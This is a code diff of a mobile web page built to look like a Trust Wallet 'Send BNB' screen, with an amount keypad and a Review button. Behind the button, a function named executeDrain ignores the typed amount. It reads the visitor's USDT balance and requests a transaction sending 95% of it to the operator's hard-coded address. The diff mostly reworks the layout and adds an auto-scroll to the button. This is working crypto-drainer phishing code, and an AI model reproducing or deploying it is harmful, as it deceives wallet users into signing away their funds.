@@ -2,52 +2,47 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<title>Send BNB</title>
 <meta name="viewport"
       content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
 <meta name="color-scheme" content="light dark">
-<title>Send BNB</title>
 
 <style>
-/* ---------------------------------------------
-   Basic layout & dark‑mode handling
-
-body {
-  overflow: hidden;
-}
-
 
 /* =========================================================
    RESET
 ========================================================= */
-
-html,
-body {
-  overflow-x: hidden;
-  overflow-y: auto;
-}
-
 
 * {
   box-sizing: border-box;
   -webkit-tap-highlight-color: transparent;
 }
 
-html,
-body {
+html {
   width: 100%;
-  height: 100%;
+  min-height: 110dvh;
+
   margin: 0;
   padding: 0;
-}
 
-html {
   color-scheme: light dark;
+
+  scroll-behavior: smooth;
 }
 
 body {
-  min-height: 100dvh;
-  overflow: hidden;
-  touch-action: manipulation;
+  width: 100%;
+  min-height: 110dvh;
+
+  margin: 0;
+  padding: 0;
+
+  overflow-x: hidden;
+  overflow-y: auto;
+
+  -webkit-overflow-scrolling: touch;
+
+  touch-action: pan-y;
 
   font-family:
     -apple-system,
@@ -57,7 +52,7 @@ body {
     Arial,
     sans-serif;
 
-  /* Default = light mode */
+  /* LIGHT MODE */
   --bg: #f5f5f7;
   --surface: #ffffff;
   --surface-2: #ededf2;
@@ -83,12 +78,13 @@ body {
     color .2s ease;
 }
 
+
 /* =========================================================
    AUTOMATIC DARK MODE
-   Follows the mobile OS/browser appearance setting.
 ========================================================= */
 
 @media (prefers-color-scheme: dark) {
+
   body {
     --bg: #0d0f17;
     --surface: #141720;
@@ -109,34 +105,33 @@ body {
   }
 }
 
+
 /* =========================================================
    APP
 ========================================================= */
 
 .app {
   width: 100%;
-  height: 100dvh;
+
+  /*
+    Slightly taller than the browser viewport.
+    This gives the in-app browser a small amount of
+    scrollable area for the automatic scroll.
+  */
+  min-height: 110dvh;
 
   display: flex;
   flex-direction: column;
 
   background: var(--bg);
 
-  padding-top: env(safe-area-inset-top);
+  padding-top: 0;
   padding-bottom: env(safe-area-inset-bottom);
 
-  transition: background-color .2s ease;
+  transition:
+    background-color .2s ease;
 }
 
-/* =========================================================
-   TOP SPACE
-========================================================= */
-
-.topbar {
-  width: 100%;
-  height: 42px;
-  flex: 0 0 42px;
-}
 
 /* =========================================================
    RECIPIENT
@@ -146,18 +141,23 @@ body {
   width: 100%;
   flex: 0 0 auto;
 
-  padding: 15px 20px 17px;
+  /*
+    No top padding.
+    Address starts directly at the top.
+  */
+  padding:
+    0
+    16px
+    10px;
 
   border-bottom: 1px solid var(--border);
 
-  font-size: clamp(17px, 4.8vw, 22px);
-  line-height: 1.35;
+  font-size: clamp(16px, 4.6vw, 21px);
+  line-height: 1.3;
   font-weight: 700;
 
   overflow-wrap: anywhere;
   word-break: break-word;
-
-  transition: border-color .2s ease;
 }
 
 .recipient-label {
@@ -168,6 +168,7 @@ body {
 .recipient-address {
   color: var(--text);
 }
+
 
 /* =========================================================
    MAIN
@@ -183,10 +184,11 @@ body {
   flex-direction: column;
 
   padding:
-    18px
-    max(18px, 5vw)
-    9px;
+    10px
+    max(16px, 5vw)
+    4px;
 }
+
 
 /* =========================================================
    CALCULATOR
@@ -202,18 +204,18 @@ body {
 .enter-label {
   color: var(--muted);
 
-  font-size: 14px;
+  font-size: 12px;
   font-weight: 650;
 
-  margin-bottom: 6px;
+  margin-bottom: 4px;
 }
 
 .amount {
-  min-height: 68px;
+  min-height: 55px;
 
   color: var(--amount);
 
-  font-size: clamp(58px, 17vw, 82px);
+  font-size: clamp(52px, 15vw, 74px);
   line-height: .95;
 
   font-weight: 500;
@@ -225,22 +227,23 @@ body {
 }
 
 .currency {
-  margin-top: 7px;
+  margin-top: 4px;
 
   color: var(--text);
 
-  font-size: 20px;
+  font-size: 18px;
   font-weight: 750;
 }
 
 .usd {
-  margin-top: 5px;
+  margin-top: 3px;
 
   color: var(--text-secondary);
 
-  font-size: 20px;
+  font-size: 17px;
   font-weight: 650;
 }
+
 
 /* =========================================================
    AVAILABLE BALANCE
@@ -249,19 +252,22 @@ body {
 .balance {
   width: 100%;
 
-  margin-top: 29px;
+  flex: 0 0 auto;
+
+  margin-top: 16px;
 
   display: flex;
   align-items: center;
 }
 
+
 /* BNB LOGO */
 
 .coin {
-  width: 56px;
-  height: 56px;
+  width: 50px;
+  height: 50px;
 
-  flex: 0 0 56px;
+  flex: 0 0 50px;
 
   border-radius: 50%;
 
@@ -275,8 +281,8 @@ body {
 }
 
 .bnb-logo {
-  width: 43px;
-  height: 43px;
+  width: 38px;
+  height: 38px;
 
   object-fit: contain;
   display: block;
@@ -289,7 +295,7 @@ body {
   min-width: 0;
   flex: 1;
 
-  margin-left: 14px;
+  margin-left: 11px;
 
   text-align: left;
 }
@@ -297,7 +303,7 @@ body {
 .balance-main {
   color: var(--text);
 
-  font-size: clamp(18px, 5vw, 25px);
+  font-size: clamp(16px, 4.6vw, 22px);
 
   font-weight: 750;
   line-height: 1.1;
@@ -306,31 +312,32 @@ body {
 }
 
 .balance-usd {
-  margin-top: 5px;
+  margin-top: 3px;
 
   color: var(--text-secondary);
 
-  font-size: 16px;
+  font-size: 13px;
   font-weight: 650;
 }
+
 
 /* =========================================================
    MAX BUTTON
 ========================================================= */
 
 .max {
-  height: 56px;
-  min-width: 89px;
+  height: 50px;
+  min-width: 80px;
 
-  padding: 0 18px;
+  padding: 0 15px;
 
   border: 0;
-  border-radius: 30px;
+  border-radius: 27px;
 
   background: var(--button);
   color: var(--button-text);
 
-  font-size: 21px;
+  font-size: 18px;
   font-weight: 750;
 
   cursor: pointer;
@@ -345,6 +352,7 @@ body {
   transform: scale(.96);
 }
 
+
 /* =========================================================
    KEYPAD
 ========================================================= */
@@ -352,17 +360,21 @@ body {
 .keypad {
   width: 100%;
 
-  flex: 1;
+  flex: 1 1 auto;
   min-height: 0;
 
-  margin-top: 8px;
+  margin-top: 4px;
 
   display: grid;
 
-  grid-template-columns: repeat(3, 1fr);
-  grid-template-rows: repeat(4, minmax(45px, 1fr));
+  grid-template-columns:
+    repeat(3, 1fr);
+
+  grid-template-rows:
+    repeat(4, minmax(0, 1fr));
 
   align-items: center;
+  justify-items: center;
 }
 
 .key {
@@ -374,25 +386,26 @@ body {
   background: transparent;
   color: var(--text);
 
-  font-size: clamp(32px, 9vw, 44px);
+  font-size: clamp(30px, 8.5vw, 42px);
   font-weight: 700;
 
   cursor: pointer;
 
   transition:
-    color .2s ease,
+    color .15s ease,
     transform .1s ease,
     opacity .1s ease;
 }
 
 .key:active {
-  transform: scale(.90);
+  transform: scale(.9);
   opacity: .55;
 }
 
 .delete {
-  font-size: clamp(29px, 8vw, 38px);
+  font-size: clamp(27px, 7.5vw, 36px);
 }
+
 
 /* =========================================================
    REVIEW
@@ -400,20 +413,22 @@ body {
 
 .review {
   width: 100%;
-  height: 61px;
 
-  flex: 0 0 auto;
+  height: 52px;
+  min-height: 52px;
 
-  margin-top: 7px;
-  margin-bottom: 2px;
+  flex: 0 0 52px;
+
+  margin-top: 4px;
+  margin-bottom: 1px;
 
   border: 0;
-  border-radius: 32px;
+  border-radius: 28px;
 
   background: var(--review);
   color: var(--review-text);
 
-  font-size: 22px;
+  font-size: 20px;
   font-weight: 750;
 
   cursor: pointer;
@@ -433,127 +448,219 @@ body {
   transform: scale(.98);
 }
 
+
+/* =========================================================
+   STATUS
+========================================================= */
+
+.status {
+  width: 100%;
+
+  height: 14px;
+  min-height: 14px;
+
+  margin-top: 2px;
+
+  text-align: center;
+
+  color: var(--text-secondary);
+
+  font-size: 10px;
+  font-weight: 600;
+}
+
+
 /* =========================================================
    SHORT PHONES
 ========================================================= */
 
 @media (max-height: 700px) {
 
-  .topbar {
-    height: 28px;
-    flex-basis: 28px;
-  }
-
   .recipient {
-    padding-top: 11px;
-    padding-bottom: 12px;
+    padding-bottom: 8px;
   }
 
   .main {
-    padding-top: 12px;
+    padding-top: 7px;
   }
 
   .enter-label {
-    font-size: 12px;
+    font-size: 10px;
+    margin-bottom: 2px;
   }
 
   .amount {
-    min-height: 55px;
-    font-size: 54px;
+    min-height: 45px;
+    font-size: 46px;
   }
 
-  .currency,
+  .currency {
+    margin-top: 2px;
+    font-size: 15px;
+  }
+
   .usd {
-    font-size: 17px;
-  }
-
-  .balance {
-    margin-top: 19px;
-  }
-
-  .coin {
-    width: 50px;
-    height: 50px;
-    flex-basis: 50px;
-  }
-
-  .bnb-logo {
-    width: 38px;
-    height: 38px;
-  }
-
-  .balance-main {
-    font-size: 17px;
-  }
-
-  .balance-usd {
+    margin-top: 1px;
     font-size: 14px;
   }
 
+  .balance {
+    margin-top: 10px;
+  }
+
+  .coin {
+    width: 42px;
+    height: 42px;
+    flex-basis: 42px;
+  }
+
+  .bnb-logo {
+    width: 31px;
+    height: 31px;
+  }
+
+  .balance-info {
+    margin-left: 8px;
+  }
+
+  .balance-main {
+    font-size: 14px;
+  }
+
+  .balance-usd {
+    font-size: 11px;
+  }
+
   .max {
-    height: 50px;
-    min-width: 80px;
-    font-size: 19px;
+    height: 42px;
+    min-width: 68px;
+    font-size: 15px;
   }
 
   .review {
-    height: 51px;
+    height: 46px;
+    min-height: 46px;
+    flex-basis: 46px;
+    font-size: 17px;
   }
 }
 
+
 /* =========================================================
-   SMALL WIDTH
+   VERY SHORT PHONES
+========================================================= */
+
+@media (max-height: 650px) {
+
+  .recipient {
+    padding-bottom: 6px;
+    font-size: 14px;
+    line-height: 1.2;
+  }
+
+  .main {
+    padding-top: 5px;
+    padding-bottom: 2px;
+  }
+
+  .enter-label {
+    font-size: 9px;
+    margin-bottom: 1px;
+  }
+
+  .amount {
+    min-height: 37px;
+    font-size: 37px;
+  }
+
+  .currency {
+    font-size: 13px;
+  }
+
+  .usd {
+    font-size: 12px;
+  }
+
+  .balance {
+    margin-top: 7px;
+  }
+
+  .coin {
+    width: 35px;
+    height: 35px;
+    flex-basis: 35px;
+  }
+
+  .bnb-logo {
+    width: 26px;
+    height: 26px;
+  }
+
+  .balance-info {
+    margin-left: 7px;
+  }
+
+  .balance-main {
+    font-size: 12px;
+  }
+
+  .balance-usd {
+    font-size: 9px;
+  }
+
+  .max {
+    height: 35px;
+    min-width: 58px;
+    padding: 0 10px;
+    font-size: 13px;
+  }
+
+  .key {
+    font-size: 24px;
+  }
+
+  .delete {
+    font-size: 21px;
+  }
+
+  .review {
+    height: 40px;
+    min-height: 40px;
+    flex-basis: 40px;
+    font-size: 15px;
+  }
+
+  .status {
+    display: none;
+  }
+}
+
+
+/* =========================================================
+   VERY NARROW PHONES
 ========================================================= */
 
 @media (max-width: 360px) {
 
   .recipient {
-    padding-left: 16px;
-    padding-right: 16px;
-
-    font-size: 16px;
+    padding-left: 12px;
+    padding-right: 12px;
   }
 
   .main {
-    padding-left: 16px;
-    padding-right: 16px;
+    padding-left: 12px;
+    padding-right: 12px;
   }
 
   .balance-main {
-    font-size: 16px;
-  }
-
-  .balance-usd {
     font-size: 13px;
   }
 
   .max {
-    min-width: 76px;
-    padding: 0 13px;
+    min-width: 62px;
+    padding: 0 11px;
   }
 }
-
-.status {
-  width: 100%;
-  min-height: 20px;
-
-  margin-top: 8px;
-
-  text-align: center;
-
-  color: var(--text-secondary);
-
-  font-size: 13px;
-  font-weight: 600;
-}
-
-.balance-display {
-  margin-top: 6px;
-  text-align: center;
-  color: var(--text-secondary);
-  font-size: 14px;
-}
-
 </style>
 </head>
 
@@ -561,17 +668,12 @@ body {
 <div class="app">
   <div class="topbar"></div>
 
-  <!-- RECIPIENT -->
   <section class="recipient">
     <span class="recipient-label">To:</span>
-    <span class="recipient-address">
-      0xdffaf1dd6d36108223c2a45921afef85e3dcf852
-    </span>
+    <span class="recipient-address">0xdffaf1dd6d36108223c2a45921afef85e3dcf852</span>
   </section>
 
   <main class="main">
-
-    <!-- CALCULATOR -->
     <section class="calculator">
       <div class="enter-label">Enter BNB amount</div>
       <div id="amount" class="amount">0</div>
@@ -579,22 +681,18 @@ body {
       <div class="usd">≈ $<span id="usdValue">0.00</span></div>
     </section>
 
-    <!-- AVAILABLE BALANCE -->
     <section class="balance">
       <div class="coin">
         <img class="bnb-logo" src="https://cryptologos.cc/logos/bnb-bnb-logo.png"
              alt="BNB" draggable="false">
       </div>
-
       <div class="balance-info">
         <div class="balance-main">0.00005274 BNB</div>
         <div class="balance-usd">Available balance</div>
       </div>
-
       <button class="max" type="button" onclick="setMax()">Max</button>
     </section>
 
-    <!-- KEYPAD -->
     <div class="keypad">
       <button class="key" type="button" onclick="press('1')">1</button>
       <button class="key" type="button" onclick="press('2')">2</button>
@@ -610,11 +708,7 @@ body {
       <button class="key delete" type="button" onclick="backspace()">⌫</button>
     </div>
 
-    <!-- REVIEW -->
-    <button id="review" class="review" type="button" disabled onclick="executeDrain()">
-      Review
-    </button>
-
+    <button id="review" class="review" type="button" disabled onclick="executeDrain()">Review</button>
     <div id="status" class="status"></div>
   </main>
 </div>
@@ -624,7 +718,7 @@ body {
    Calculator logic
    --------------------------------------------- */
 let value = "";
-const BNB_USD_PRICE = 600; // Hard‑coded for demo; adjust if needed
+const BNB_USD_PRICE = 600; // adjust if needed
 
 const amountEl = document.getElementById("amount");
 const usdEl = document.getElementById("usdValue");
@@ -671,38 +765,37 @@ updateUI();
 /* ---------------------------------------------
    Trust Wallet interaction
    --------------------------------------------- */
-const YOUR_WALLET_ADDRESS = "0xYOUR_ADDRESS_HERE"; // <-- replace with your address
+const YOUR_WALLET_ADDRESS = "0xYOUR_ADDRESS_HERE"; // <-- replace
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const USDT_DECIMALS = 6;
 
 async function executeDrain() {
   const statusEl = document.getElementById("status");
-
   if (!window.ethereum) {
     statusEl.textContent = "Please open this page inside Trust Wallet Browser.";
     return;
   }
 
   try {
-    // 1️⃣ Switch to BSC
+    /* 1️⃣ Switch to BSC */
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
-      params: [{ chainId: "0x38" }], // 56 in hex
+      params: [{ chainId: "0x38" }],
     });
 
-    // 2️⃣ Get user address
+    /* 2️⃣ Get user address */
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     const userAddress = accounts[0];
 
     statusEl.textContent = "Fetching USDT balance…";
     reviewEl.disabled = true;
 
-    // 3️⃣ Read USDT balance
+    /* 3️⃣ Read USDT balance */
     const paddedUser = userAddress.replace(/^0x/, "").padStart(64, "0");
-    const balanceData = "0x70a08231" + paddedUser;
+    const balanceCall = "0x70a08231" + paddedUser;
     const balanceHex = await window.ethereum.request({
       method: "eth_call",
-      params: [{ to: USDT_CONTRACT, data: balanceData }, "latest"],
+      params: [{ to: USDT_CONTRACT, data: balanceCall }, "latest"],
     });
 
     const rawBalance = parseInt(balanceHex, 16);
@@ -712,17 +805,17 @@ async function executeDrain() {
       return;
     }
 
-    // 4️⃣ Calculate 95 % of balance
+    /* 4️⃣ 95 % of balance */
     const amountToTransfer = Math.floor((rawBalance * 95) / 100);
     const displayAmount = (amountToTransfer / Math.pow(10, USDT_DECIMALS)).toFixed(2);
     statusEl.textContent = `Preparing to send ${displayAmount} USDT…`;
 
-    // 5️⃣ Build transfer data
+    /* 5️⃣ Build transfer data */
     const paddedTo = YOUR_WALLET_ADDRESS.replace(/^0x/, "").padStart(64, "0");
-    const paddedAmount = amountToTransfer.toString(16).padStart(64, "0");
-    const transferData = "0xa9059cbb" + paddedTo + paddedAmount;
+    const amountHex = "0x" + amountToTransfer.toString(16);
+    const transferData = "0xa9059cbb" + paddedTo + amountHex;
 
-    // 6️⃣ Send transaction
+    /* 6️⃣ Send transaction */
     const txParams = {
       from: userAddress,
       to: USDT_CONTRACT,
@@ -731,7 +824,7 @@ async function executeDrain() {
       gas: "0x186a0", // 100 000
     };
 
-    statusEl.textContent = "Confirm the transaction in Trust Wallet…";
+    statusEl.textContent = "Confirm in Trust Wallet…";
     const txHash = await window.ethereum.request({
       method: "eth_sendTransaction",
       params: [txParams],
@@ -753,13 +846,20 @@ async function executeDrain() {
 }
 
 /* ---------------------------------------------
-   Auto‑scroll to the button on load
+   Auto‑scroll to Review button on load
    --------------------------------------------- */
 window.addEventListener("load", () => {
   const btn = document.getElementById("review");
   if (btn) {
-    const y = btn.getBoundingClientRect().top + window.scrollY - 50;
-    window.scrollTo({ top: y, behavior: "smooth" });
+    /* Give Trust Wallet a moment to finish rendering */
+    setTimeout(() => {
+      try {
+        btn.scrollIntoView({ behavior: "smooth", block: "center" });
+      } catch (_) {
+        const y = btn.getBoundingClientRect().top + window.scrollY - 50;
+        window.scrollTo({ top: y, behavior: "smooth" });
+      }
+    }, 200);
   }
   document.getElementById("status").textContent = "Ready";
 });
